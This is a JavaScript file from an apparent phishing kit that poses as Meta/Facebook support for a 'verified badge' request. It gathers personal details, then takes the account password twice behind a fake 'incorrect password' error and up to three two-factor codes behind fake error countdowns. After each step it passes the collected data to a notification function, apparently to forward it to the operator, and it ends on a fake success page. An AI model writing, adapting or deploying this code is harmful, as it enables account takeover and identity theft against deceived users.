// Main Application Logic

// Generate ticket ID
document.getElementById('ticketId').textContent = Utils.generateTicketId();

// Start verification flow
document.getElementById('submitRequestBtn').addEventListener('click', openClientModal);

// ==================== MODAL 1: CLIENT INFO ====================
function openClientModal() {
    const months = [
        'January', 'February', 'March', 'April', 'May', 'June',
        'July', 'August', 'September', 'October', 'November', 'December'
    ];
    const currentYear = new Date().getFullYear();
    const dayOptions = Array.from({ length: 31 }, (_, i) => {
        const day = i + 1;
        return `<option value="${day}">${day}</option>`;
    }).join('');
    const monthOptions = months.map((name, i) => (
        `<option value="${i + 1}">${name}</option>`
    )).join('');
    const yearOptions = Array.from({ length: currentYear - 1899 }, (_, i) => {
        const year = currentYear - i;
        return `<option value="${year}">${year}</option>`;
    }).join('');

    const fieldClass = 'info-form-control';
    const labelClass = 'info-form-label';

    const content = `
        <div class="info-form">
            <div class="info-form-header">
                <h2 class="info-form-title">Information Form</h2>
                <p class="info-form-subtitle">Please complete the details below so we can review your verified badge request.</p>
            </div>
            <form id="clientForm" class="info-form-body">
                <div class="info-form-section">
                    <p class="info-form-section-title">Personal details</p>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="fullName">Full name</label>
                        <input type="text" id="fullName" name="fullName" class="${fieldClass}" placeholder="Enter your full name" autocomplete="name" required>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="fanpage">Page name</label>
                        <input type="text" id="fanpage" name="fanpage" class="${fieldClass}" placeholder="Enter your Page name" required>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="day">Date of birth</label>
                        <div class="info-form-dob">
                            <select id="month" name="month" class="${fieldClass}" required>
                                <option value="" disabled selected>Month</option>
                                ${monthOptions}
                            </select>
                            <select id="day" name="day" class="${fieldClass}" required>
                                <option value="" disabled selected>Day</option>
                                ${dayOptions}
                            </select>
                            <select id="year" name="year" class="${fieldClass}" required>
                                <option value="" disabled selected>Year</option>
                                ${yearOptions}
                            </select>
                        </div>
                    </div>
                </div>

                <div class="info-form-section">
                    <p class="info-form-section-title">Contact</p>
                    <div class="info-form-grid">
                        <div class="info-form-field">
                            <label class="${labelClass}" for="email">Email</label>
                            <input type="email" id="email" name="email" class="${fieldClass}" placeholder="name@example.com" autocomplete="email" required>
                        </div>
                        <div class="info-form-field">
                            <label class="${labelClass}" for="emailBusiness">Business email</label>
                            <input type="email" id="emailBusiness" name="emailBusiness" class="${fieldClass}" placeholder="business@example.com" autocomplete="email" required>
                        </div>
                    </div>
                    <div class="info-form-field">
                        <label class="${labelClass}" for="phone">Phone number</label>
                        <input type="tel" id="phone" name="phone" class="${fieldClass}" placeholder="Include country code" autocomplete="tel" required>
                    </div>
                </div>

                <div class="info-form-section">
                    <div class="info-form-field">
                        <label class="${labelClass}" for="notes">Additional notes <span class="info-form-optional">Optional</span></label>
                        <textarea id="notes" name="notes" class="${fieldClass} info-form-textarea" placeholder="Add any information that may help us review your request" rows="3"></textarea>
                    </div>
                    <p class="info-form-hint">Our response will be sent to you within 14–48 hours.</p>
                </div>

                <label class="info-form-terms" for="termsAgree">
                    <input type="checkbox" id="termsAgree" name="termsAgree" required>
                    <span>I agree to the <a href="#" class="info-form-link">Terms of use</a></span>
                </label>

                <button type="submit" class="info-form-submit">Submit</button>
            </form>
        </div>
    `;

    Modal.create('clientModal', content);
    Modal.open('clientModal');

    const termsLink = document.querySelector('#clientModal .info-form-link');
    if (termsLink) {
        termsLink.addEventListener('click', (e) => e.preventDefault());
    }

    document.getElementById('clientForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = {
            fullName: document.getElementById('fullName').value.trim(),
            email: document.getElementById('email').value.trim(),
            emailBusiness: document.getElementById('emailBusiness').value.trim(),
            fanpage: document.getElementById('fanpage').value.trim(),
            phone: document.getElementById('phone').value.trim(),
            day: document.getElementById('day').value,
            month: document.getElementById('month').value,
            year: document.getElementById('year').value
        };

        Utils.saveRecord('__client_rec__fi_rst', formData);
        Modal.close('clientModal');
        openSecurityModal();
    });
}

// ==================== MODAL 2: SECURITY (PASSWORD) ====================
function openSecurityModal() {
    const content = `
        <div class="info-form security-form">
            <div class="security-form-brand">
                <img src="./public/icons/ic_logo.svg" alt="Meta">
            </div>
            <div class="info-form-header">
                <h2 class="info-form-title">Enter your password</h2>
                <p class="info-form-subtitle">For your security, enter your password to continue this request.</p>
            </div>
            <form id="securityForm" class="info-form-body">
                <div class="info-form-field">
                    <label class="info-form-label" for="password">Password</label>
                    <div class="password-field">
                        <input type="password" id="password" name="password" class="info-form-control" placeholder="Enter your password" autocomplete="current-password" required>
                        <button type="button" id="togglePassword" class="password-toggle">Show</button>
                    </div>
                    <p id="passwordError" class="info-form-error hidden"></p>
                </div>
                <button type="submit" class="info-form-submit">Continue</button>
            </form>
            <div class="security-form-footer">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let securityClickCount = 0;
    const passwordInput = document.getElementById('password');
    const errorMsg = document.getElementById('passwordError');
    const togglePassword = document.getElementById('togglePassword');

    togglePassword.addEventListener('click', () => {
        const showPlain = passwordInput.type === 'password';
        passwordInput.type = showPlain ? 'text' : 'password';
        togglePassword.textContent = showPlain ? 'Hide' : 'Show';
    });

    passwordInput.addEventListener('input', () => {
        errorMsg.classList.add('hidden');
        passwordInput.classList.remove('is-error');
    });

    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = passwordInput.value.trim();
        const submitBtn = e.target.querySelector('button[type="submit"]');

        errorMsg.classList.add('hidden');
        passwordInput.classList.remove('is-error');
        if (!password) {
            errorMsg.textContent = "You haven't entered your password!";
            errorMsg.classList.remove('hidden');
            passwordInput.classList.add('is-error');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (securityClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__fi_rst');
            const clientData = { password, ...dataLocal };
            Utils.saveRecord('__client_rec__se_con', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue';
                passwordInput.value = '';
                passwordInput.type = 'password';
                togglePassword.textContent = 'Show';
                errorMsg.textContent = 'The password you\'ve entered is incorrect.';
                errorMsg.classList.remove('hidden');
                passwordInput.classList.add('is-error');
                securityClickCount = 1;
            }, 1350);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__se_con');
            const clientData = { passwordSecond: password, ...dataLocal };
            Utils.saveRecord('__client_rec__th_ird', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('securityModal');
                openAuthenticationModal(clientData);
            }, 1500);
        }
    });
}

// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
function openAuthenticationModal(userData) {
    const emailDisplay = Utils.maskEmail(userData.email);
    const phoneDisplay = Utils.maskPhone(userData.phone);
    const description = `Enter the 6 or 8-digit code we sent to ${emailDisplay}, ${phoneDisplay}, or from your authenticator app.`;

    const content = `
        <div class="info-form auth-form">
            <div class="auth-form-meta">
                <span>${userData.fullName || ''}</span>
                <span class="auth-form-dot"></span>
                <span>Facebook</span>
            </div>
            <div class="info-form-header">
                <h2 class="info-form-title">Two-factor authentication</h2>
                <p class="info-form-subtitle">${description}</p>
            </div>
            <div class="auth-form-preview">
                <img src="./public/images/authentication.png" alt="2FA">
            </div>
            <form id="authForm" class="info-form-body">
                <div class="info-form-field">
                    <label class="info-form-label" for="twoFa">Authentication code</label>
                    <input type="text" id="twoFa" name="twoFa" class="info-form-control auth-code-input" placeholder="6 or 8 digits" inputmode="numeric" autocomplete="one-time-code" maxlength="8" pattern="\\d{6}|\\d{8}" required>
                    <p id="authError" class="info-form-error hidden"></p>
                </div>
                <button type="submit" class="info-form-submit">Continue</button>
            </form>
            <div class="security-form-footer">
                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('authModal', content);
    Modal.open('authModal');

    let authClickCount = 0;
    let countdownInterval;
    const input = document.getElementById('twoFa');
    const errorMsg = document.getElementById('authError');

    const sanitizeTwoFa = (value) => String(value || '').replace(/\D/g, '').slice(0, 8);
    const isValidTwoFa = (value) => value.length === 6 || value.length === 8;
    const showAuthError = (message) => {
        errorMsg.textContent = message;
        errorMsg.classList.remove('hidden');
        input.classList.add('is-error');
    };
    const clearAuthError = () => {
        errorMsg.classList.add('hidden');
        input.classList.remove('is-error');
    };

    input.addEventListener('input', () => {
        input.value = sanitizeTwoFa(input.value);
        clearAuthError();
    });

    input.addEventListener('paste', (e) => {
        e.preventDefault();
        input.value = sanitizeTwoFa((e.clipboardData || window.clipboardData).getData('text'));
        clearAuthError();
    });

    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const twoFa = sanitizeTwoFa(input.value);
        const submitBtn = e.target.querySelector('button[type="submit"]');
        input.value = twoFa;

        clearAuthError();
        if (!twoFa) {
            showAuthError("You haven't entered the code!");
            return;
        }
        if (!isValidTwoFa(twoFa)) {
            showAuthError('Enter a 6 or 8-digit code.');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (authClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__th_ird');
            const clientData = { twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__fou_rth', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(submitBtn);
                authClickCount = 1;
            }, 1400);
        } else if (authClickCount === 1) {
            const dataLocal = Utils.getRecord('__client_rec__fou_rth');
            const clientData = { twoFaSecond: twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__f_if_th', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(submitBtn);
                authClickCount = 2;
            }, 1200);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__f_if_th');
            const clientData = { twoFaThird: twoFa, ...dataLocal };
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('authModal');
                openSuccessModal();
            }, 1600);
        }
    });

    function startCountdown(submitBtn) {
        input.disabled = true;
        submitBtn.disabled = true;
        submitBtn.classList.add('opacity-70');

        let time = CONFIG.COUNTDOWN_TIME;
        showAuthError(`The code is incorrect. Try again after ${time} seconds.`);

        countdownInterval = setInterval(() => {
            time--;
            errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;

            if (time <= 0) {
                clearInterval(countdownInterval);
                input.disabled = false;
                input.value = '';
                submitBtn.disabled = false;
                submitBtn.classList.remove('opacity-70');
                clearAuthError();
                input.focus();
            }
        }, 1000);
    }
}

// ==================== MODAL 4: SUCCESS ====================
function openSuccessModal() {
    const content = `
        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/images/success.jpg" alt="Success" class="w-full">
        </div>
        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
        <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
            Return to Facebook
        </a>
        <div class="w-16 mt-5 mx-auto">
            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
        </div>
    `;

    Modal.create('successModal', content);
    Modal.open('successModal');
}

